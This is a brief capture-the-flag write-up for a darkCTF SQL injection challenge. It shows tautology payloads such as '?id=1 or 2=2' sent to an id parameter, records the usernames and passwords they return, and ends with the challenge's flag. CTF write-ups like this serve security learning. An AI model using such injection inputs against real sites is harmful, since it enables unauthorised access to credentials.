## Briefing:  
` Try to find username and password.   
Webiste: http://simplesql.darkarmy.xyz/.`

In the source we see the comment `<!-- Try id as parameter --> `.  

Injecting a simple `?id=1 or 2=2` gives us the response `Username : LOL Password : Try`.  

Trying `?id=2 or 2=2` gives us a difference response, `Username : Try Password : another`, so I tried a few more till at `http://simplesql.darkarmy.xyz/?id=9%20or%202=2` you get the flag. 

### Flag:  
`darkCTF{it_is_very_easy_to_find}`

